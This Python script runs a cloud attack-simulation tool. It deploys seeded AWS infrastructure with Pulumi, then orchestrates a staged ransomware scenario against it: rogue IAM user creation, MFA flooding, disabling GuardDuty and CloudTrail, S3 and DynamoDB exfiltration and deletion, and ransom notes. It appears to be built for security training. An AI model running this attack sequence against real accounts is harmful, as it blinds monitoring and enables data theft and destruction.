#!/usr/bin/env python3
"""
North Korean Cloud Nightmare - Infrastructure Deployment and Attack Simulation

This tool provides a comprehensive simulation of a North Korean APT-style attack scenario
for security demonstrations and training purposes.

Commands:
- deploy_infrastructure: Deploy AWS infrastructure only
- launch_attack: Execute attack simulation (requires infrastructure to be deployed)
- execute_full_scenario: Deploy infrastructure and launch attack in sequence
- clean_up: Remove all deployed infrastructure and artifacts
"""

import os
import subprocess
import json
import time
import random
import string
import argparse
import sys
from tqdm import tqdm
from time import sleep
from termcolor import colored
import Functions
from Helpers import loading_animation
import pyqrcode
# Import clean_up module only when needed
import pulumi
import pulumi_aws as aws
import boto3
from attack import Attack
from MFA import MFASetup
from Load_Pulumi_Outputs import get_infrastructure_output
from ransomware import Ransomware


# Initialize AWS Clients (only when needed)
iam_client = None
sts_client = None

OUTPUT_PATH = "/workspaces/North_Korean_Cloud_Nightmare/Infra/forrester-2025-output.json"


def check_and_setup_environment():
    """Check and setup required environment (AWS and Pulumi)"""
    print(colored("🔧 Checking Environment Setup...", "cyan"))

    # Check AWS credentials
    try:
        import boto3
        sts = boto3.client('sts')
        identity = sts.get_caller_identity()
        print(colored(f"✅ AWS credentials found - Account: {identity['Account']}", "green"))
    except Exception as e:
        print(colored("❌ AWS credentials not configured!", "red"))
        print(colored("Please run: aws configure", "yellow"))
        return False

    # Check Pulumi login status
    try:
        result = subprocess.run(["pulumi", "whoami"],
                              capture_output=True, text=True,
                              cwd="/workspaces/North_Korean_Cloud_Nightmare/Infra")
        if result.returncode == 0:
            username = result.stdout.strip()
            print(colored(f"✅ Pulumi logged in as: {username}", "green"))
            return True
        else:
            raise Exception("Not logged in")
    except:
        print(colored("❌ Pulumi not logged in!", "red"))
        print(colored("Setting up Pulumi login...", "yellow"))

        # Try to get token from environment first
        if os.environ.get('PULUMI_ACCESS_TOKEN'):
            print(colored("✅ Found PULUMI_ACCESS_TOKEN environment variable", "green"))
            return True

        print(colored("Please choose one of the following options:", "cyan"))
        print("1. Set PULUMI_ACCESS_TOKEN environment variable")
        print("2. Login interactively with 'pulumi login'")
        print("")
        print(colored("For option 1, get your token from: https://app.pulumi.com/account/tokens", "blue"))
        print(colored("Then run: export PULUMI_ACCESS_TOKEN=your_token_here", "blue"))
        print("")
        print(colored("For option 2, run the following from the Infra directory:", "blue"))
        print(colored("cd Infra && pulumi login", "blue"))

        return False


def ensure_pulumi_stack():
    """Ensure Pulumi stack exists and is properly configured"""
    print(colored("🔧 Setting up Pulumi stack...", "cyan"))

    # Change to Infra directory
    original_dir = os.getcwd()
    try:
        os.chdir("/workspaces/North_Korean_Cloud_Nightmare/Infra")

        # Check if stack exists
        result = subprocess.run(["pulumi", "stack", "ls"],
                              capture_output=True, text=True)

        if "dev" not in result.stdout:
            print(colored("Creating 'dev' stack...", "yellow"))
            subprocess.run(["pulumi", "stack", "init", "dev"], check=True)

        # Select the dev stack
        subprocess.run(["pulumi", "stack", "select", "dev"], check=True)

        # Install required plugins
        print(colored("Installing required Pulumi plugins...", "yellow"))
        try:
            subprocess.run(["pulumi", "plugin", "install", "resource", "aws"],
                         capture_output=True, check=True)
            print(colored("✅ AWS plugin installed", "green"))
        except subprocess.CalledProcessError:
            print(colored("⚠️ AWS plugin installation failed, but continuing...", "yellow"))

        # Check for Python language plugin issue and attempt to fix it
        try:
            # Test if Python language plugin works by creating a minimal project
            test_result = subprocess.run(["pulumi", "preview", "--dry-run"],
                                       capture_output=True, text=True)

            if "failed to load language plugin python" in test_result.stderr:
                print(colored("⚠️ Python language plugin issue detected, attempting fix...", "yellow"))

                # Attempt to force plugin initialization by creating test project
                import tempfile
                with tempfile.TemporaryDirectory() as temp_dir:
                    os.chdir(temp_dir)

                    # Create minimal Pulumi.yaml
                    with open("Pulumi.yaml", "w") as f:
                        f.write("name: test-fix\nruntime: python\ndescription: Plugin fix test\n")

                    # Create minimal __main__.py
                    with open("__main__.py", "w") as f:
                        f.write("import pulumi\npulumi.export('test', 'fix')\n")

                    # Initialize stack to force plugin loading
                    subprocess.run(["pulumi", "stack", "init", "test-fix-stack", "--non-interactive"],
                                 capture_output=True)

                    # Test if it works now
                    os.chdir("/workspaces/North_Korean_Cloud_Nightmare/Infra")

                print(colored("✅ Python language plugin fix attempted", "green"))
        except Exception as e:
            print(colored(f"⚠️ Python plugin check failed: {e}, but continuing...", "yellow"))

        print(colored("✅ Pulumi stack 'dev' ready", "green"))
        return True

    except subprocess.CalledProcessError as e:
        print(colored(f"❌ Failed to setup Pulumi stack: {e}", "red"))
        return False
    except Exception as e:
        print(colored(f"❌ Unexpected error: {e}", "red"))
        return False
    finally:
        os.chdir(original_dir)


def setup():
    """Setup and validate environment for North Korean Cloud Nightmare"""
    print(colored("🔧 Setting up North Korean Cloud Nightmare Environment", "cyan", attrs=["bold"]))
    print("=" * 60)

    # Check environment
    if not check_and_setup_environment():
        print(colored("❌ Environment setup failed!", "red", attrs=["bold"]))
        return False

    # Setup Pulumi stack
    if not ensure_pulumi_stack():
        print(colored("❌ Pulumi stack setup failed!", "red", attrs=["bold"]))
        return False

    print("\n" + colored("🎉 Environment setup completed successfully!", "green", attrs=["bold"]))
    print(colored("You can now run the other commands:", "white"))
    print(colored("  • deploy_infrastructure", "cyan"))
    print(colored("  • launch_attack", "cyan"))
    print(colored("  • execute_full_scenario", "cyan"))
    print(colored("  • clean_up", "cyan"))
    return True


def deploy_infrastructure():
    """Deploy AWS infrastructure for the North Korean Cloud Nightmare scenario"""
    print(colored("🚀 Starting Infrastructure Deployment...", "cyan", attrs=["bold"]))
    print("-" * 50)

    # Check environment setup first
    if not check_and_setup_environment():
        return False

    # Setup Pulumi stack
    if not ensure_pulumi_stack():
        return False

    # Execute infrastructure deployment
    forrester_scenario_execute()

    # Validate rollout
    print("\n" + colored("✅ Validating Infrastructure Rollout...", "yellow"))
    forrester_scenario_validate_rollout()

    # Validate data
    print("\n" + colored("📊 Validating Data Population...", "yellow"))
    forrester_scenario_validate_data()

    print("\n" + colored("🎉 Infrastructure deployment completed successfully!", "green", attrs=["bold"]))
    return True


def launch_attack():
    """Launch the attack simulation (requires infrastructure to be deployed)"""
    global iam_client, sts_client

    # Initialize AWS clients when needed
    if iam_client is None:
        iam_client = boto3.client("iam")
    if sts_client is None:
        sts_client = boto3.client("sts")

    print(colored("⚔️  Launching Attack Simulation...", "red", attrs=["bold"]))
    print("-" * 50)

    # Check if infrastructure is deployed
    if not os.path.exists(OUTPUT_PATH):
        print(colored("❌ ERROR: Infrastructure not found! Please run 'deploy_infrastructure' first.", "red"))
        return False

    try:
        # Verify infrastructure outputs are valid
        with open(OUTPUT_PATH, "r") as file:
            outputs = json.load(file)
        if not outputs:
            raise ValueError("Empty infrastructure outputs")
    except (json.JSONDecodeError, FileNotFoundError, ValueError) as e:
        print(colored(f"❌ ERROR: Invalid infrastructure state: {e}", "red"))
        print(colored("Please run 'deploy_infrastructure' first.", "yellow"))
        return False

    print(colored("✅ Infrastructure found. Proceeding with attack simulation...", "green"))

    # Setup MFA for DevOpsUser
    print("\n" + colored("🔐 Setting up MFA for DevOpsUser...", "cyan"))
    user_arn = get_infrastructure_output("devops_user_arn")
    user = user_arn.split("/")[-1]  # Extracts the username
    print(f"DEBUG: Extracted IAM Username: {user}")

    mfa_arn = ""
    mfa = MFASetup(user, mfa_arn, iam_client, sts_client, OUTPUT_PATH)
    mfa.setup_mfa_and_login()

    # Begin attack enumeration
    print("\n" + colored("🔍 Enumerating AWS resources...", "cyan"))
    attack = Attack()
    attack.enumeration.run_all_enumerations()

    # Create malicious user
    print("\n" + colored("👤 DevopsUser creating malicious user...", "red"))
    user_name = generate_unique_username()
    ransomware_access_keys = attack.createuser_attatchpolicies.run_pipeline(
        username=user_name,
        policy_arns=[
            "arn:aws:iam::aws:policy/AmazonDynamoDBFullAccess",
            "arn:aws:iam::aws:policy/AmazonS3FullAccess"
        ]
    )

    access_key, secret_key = ransomware_access_keys[0][0], ransomware_access_keys[1][0]
    print(f"🔑 {user_name} Access Key: {access_key}")
    print(f"🔑 {user_name} Secret Key: {secret_key}")

    # Initialize ransomware attack
    print("\n" + colored("💀 Initializing Ransomware Attack...", "red", attrs=["bold"]))
    ransomware = Ransomware(access_key, secret_key)
    ransomware.session_test()

    # Execute attack phases
    print("\n" + colored("🎯 Phase 1: MFA DDOS on DevOps Team", "red"))
    ransomware.devops_team_MFA_DDOS()
    Functions.attack_execution_duration(seconds=30, description="MFA DDOS complete, waiting 30 seconds")

    print("\n" + colored("🛡️  Phase 2: Disabling Security Controls", "red"))
    ransomware.disable_guardduty()
    ransomware.delete_guardduty()
    Functions.attack_execution_duration(seconds=30, description="GuardDuty disabled, waiting 30 seconds")

    ransomware.stop_cloudtrail_logging()
    ransomware.delete_cloudtrail()
    Functions.attack_execution_duration(seconds=30, description="CloudTrail disabled, waiting 30 seconds")

    print("\n" + colored("💾 Phase 3: S3 Data Exfiltration & Destruction", "red"))
    ransomware.s3_drain.exfiltrate()
    Functions.attack_execution_duration(seconds=15, description="S3 exfiltration complete, waiting 15 seconds")

    ransomware.s3_drain.delete_objects()
    Functions.attack_execution_duration(seconds=15, description="S3 deletion complete, waiting 15 seconds")

    ransomware.s3_drain.place_ransom_note()
    Functions.attack_execution_duration(seconds=30, description="S3 attack complete, waiting 30 seconds before DynamoDB phase")

    print("\n" + colored("🗃️  Phase 4: DynamoDB Data Exfiltration & Destruction", "red"))
    ransomware.dynamodb_drain.exfiltrate()
    Functions.attack_execution_duration(seconds=15, description="DynamoDB exfiltration complete, waiting 15 seconds")

    ransomware.dynamodb_drain.delete_tables()
    Functions.attack_execution_duration(seconds=15, description="DynamoDB deletion complete, waiting 15 seconds")

    ransomware.dynamodb_drain.create_ransom_table()
    Functions.attack_execution_duration(seconds=15, description="Ransom table created, waiting 15 seconds")

    ransomware.dynamodb_drain.insert_ransom_note()

    print("\n" + colored("💀 Attack Simulation Completed Successfully!", "red", attrs=["bold"]))
    print(colored("🔍 Check ./AWS_Enumeration, ./Infra/s3_Exfiltration, and ./Infra/DynamoDB_Exfiltration for attack artifacts", "yellow"))
    return True


def execute_full_scenario():
    """Execute the complete scenario: deploy infrastructure and launch attack"""
    print(colored("🌊 Executing Full North Korean Cloud Nightmare Scenario", "magenta", attrs=["bold"]))
    print("=" * 60)

    # Deploy infrastructure
    if not deploy_infrastructure():
        print(colored("❌ Infrastructure deployment failed. Aborting.", "red"))
        return False

    print("\n" + "=" * 60)
    print(colored("🔄 Transitioning to Attack Phase...", "yellow"))
    Functions.progress_bar(seconds=15)  # Brief pause between phases

    # Launch attack
    if not launch_attack():
        print(colored("❌ Attack simulation failed.", "red"))
        return False

    print("\n" + "=" * 60)
    print(colored("🎉 Full North Korean Cloud Nightmare Scenario Completed!", "green", attrs=["bold"]))
    return True


def clean_up():
    """Clean up all deployed infrastructure and artifacts"""
    print(colored("🧹 Starting Clean Up Process...", "yellow", attrs=["bold"]))
    print("-" * 50)

    # Check environment setup first
    if not check_and_setup_environment():
        return False

    # Setup Pulumi stack
    if not ensure_pulumi_stack():
        return False

    try:
        # Import clean_up module only when needed
        from clean_up import full_cleanup
        full_cleanup()
        print(colored("✅ Clean up completed successfully!", "green", attrs=["bold"]))
        return True
    except Exception as e:
        print(colored(f"❌ Clean up failed: {str(e)}", "red"))
        return False


def generate_unique_username(base_name="run_while_u_can", length=6):
    """Generate a unique username with random suffix"""
    random_suffix = ''.join(random.choices(string.digits, k=length))
    return f"{base_name}_{random_suffix}"


# Original functions from Forrester_Scenario.py
def forrester_scenario_execute():
    """ Execute Infrastructure Deployment for the Forrester 2025 Attack Scenario"""

    print("-" * 30)
    print(colored("Executing Forrester 2025 Scenario: Compromise DevOps User, takeover, priv escalation, perform ransomware on S3 & DynamoDB", color="red"))
    loading_animation()
    print("-" * 30)

    print(colored("Rolling out Infrastructure for North Korean Cloud Nightmare", color="red"))
    loading_animation()
    print("-" * 30)

    file_path = "/workspaces/North_Korean_Cloud_Nightmare/Infra/forrester-2025-output.json"

    #  Ensure Previous Output is Removed
    if os.path.exists(file_path):
        os.remove(file_path)
        print(f" Previous output file '{file_path}' found and deleted.")
    else:
        print(f" Output file '{file_path}' not found, proceeding...")

    #  Execute Infrastructure Deployment
    # Change current working directory to 'Infra'
    os.chdir("/workspaces/North_Korean_Cloud_Nightmare/Infra/")

    print(colored("🚀 Deploying AWS Infrastructure...", "cyan"))
    print(colored("This may take 5-10 minutes. Please wait...", "yellow"))

    # Run pulumi up with error filtering to hide plugin warnings
    result = subprocess.run(
        ["pulumi", "up", "-s", "dev", "-y"],
        capture_output=True,
        text=True
    )

    # Print stdout (the useful deployment progress)
    if result.stdout:
        print(result.stdout)

    # Filter stderr to hide the python plugin error but show real errors
    if result.stderr:
        stderr_lines = result.stderr.split('\n')
        filtered_errors = []
        for line in stderr_lines:
            # Skip the python language plugin error
            if "failed to load language plugin python" not in line and \
               "pulumi-language-python" not in line and \
               line.strip():
                filtered_errors.append(line)

        if filtered_errors:
            print(colored("⚠️ Warnings:", "yellow"))
            for error in filtered_errors:
                print(colored(f"  {error}", "yellow"))

    if result.returncode != 0:
        print(colored("❌ Infrastructure deployment failed!", "red"))
        return False

    #  Capture Infrastructure Stack Output
    subprocess.call("pulumi stack -s dev output --json > /workspaces/North_Korean_Cloud_Nightmare/Infra/forrester-2025-output.json", shell=True)
    print(" Output saved inside /workspaces/North_Korean_Cloud_Nightmare/Infra/forrester-2025-output.json")


def forrester_scenario_validate_rollout():
    """ Validate that infrastructure successfully deployed all resources"""

    Functions.wait_for_output_file()
    Functions.validate_infrastructure_outputs_after_rollout(infrastructure_stack_output_file="/workspaces/North_Korean_Cloud_Nightmare/Infra/forrester-2025-output.json")


def forrester_scenario_validate_data():
    """ Validate that infrastructure-created data exists in S3 and DynamoDB"""

    print("\n Running Post-Deployment Validation Checks...")

    # Ensure Infrastructure Stack Output is Up to Date
    subprocess.run("pulumi stack -s dev output --json > /workspaces/North_Korean_Cloud_Nightmare/Infra/forrester-2025-output.json", shell=True)

    # Load Infrastructure Outputs
    with open("/workspaces/North_Korean_Cloud_Nightmare/Infra/forrester-2025-output.json", "r") as file:
        outputs = json.load(file)

    # Validate S3 Buckets
    s3_buckets = [
        outputs["config_files_bucket"],
        outputs["customer_data_bucket"],
        outputs["payment_data_bucket"]
    ]

    for bucket in s3_buckets:
        validation_cmd = f"aws s3 ls s3://{bucket} --region us-east-1"
        result = subprocess.run(validation_cmd, shell=True, capture_output=True, text=True)

        if result.stdout:
            print(f"S3 Validation Passed: Data exists in bucket {bucket}")
        else:
            print(f"ERROR: No data found in {bucket}")

    # Validate DynamoDB Tables
    dynamodb_tables = ["CustomerOrdersTable", "CustomerSSNTable"]

    for table in dynamodb_tables:
        validation_cmd = f"aws dynamodb scan --table-name {outputs[table]} --region us-east-1 --limit 1"
        result = subprocess.run(validation_cmd, shell=True, capture_output=True, text=True)

        if '"Items"' in result.stdout:
            print(f"DynamoDB Validation Passed: Records found in {outputs[table]}")
        else:
            print(f"ERROR: No records found in {outputs[table]}")

    print("\nPost-Deployment Data Validation Complete!")


def main():
    """Main function with argument parsing"""
    parser = argparse.ArgumentParser(
        description="North Korean Cloud Nightmare - Infrastructure Deployment and Attack Simulation",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python North_Korean_Cloud_Nightmare.py setup
  python North_Korean_Cloud_Nightmare.py deploy_infrastructure
  python North_Korean_Cloud_Nightmare.py launch_attack
  python North_Korean_Cloud_Nightmare.py execute_full_scenario
  python North_Korean_Cloud_Nightmare.py clean_up

For more information, see the README.md file.
        """
    )

    parser.add_argument(
        "command",
        choices=["setup", "deploy_infrastructure", "launch_attack", "execute_full_scenario", "clean_up"],
        help="Command to execute"
    )

    parser.add_argument(
        "--verbose", "-v",
        action="store_true",
        help="Enable verbose output"
    )

    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)

    args = parser.parse_args()

    # Print banner
    print("=" * 60)
    print(colored("🇰🇵 NORTH KOREAN CLOUD NIGHTMARE 🇰🇵", "red", attrs=["bold"]))
    print(colored("Advanced Persistent Threat Simulation Platform", "white"))
    print("=" * 60)

    # Execute the requested command
    success = False

    if args.command == "setup":
        success = setup()
    elif args.command == "deploy_infrastructure":
        success = deploy_infrastructure()
    elif args.command == "launch_attack":
        success = launch_attack()
    elif args.command == "execute_full_scenario":
        success = execute_full_scenario()
    elif args.command == "clean_up":
        success = clean_up()

    # Exit with appropriate code
    if success:
        print(colored(f"\nCommand '{args.command}' completed successfully!", "green", attrs=["bold"]))
        sys.exit(0)
    else:
        print(colored(f"\nCommand '{args.command}' failed!", "red", attrs=["bold"]))
        sys.exit(1)


if __name__ == "__main__":
    main()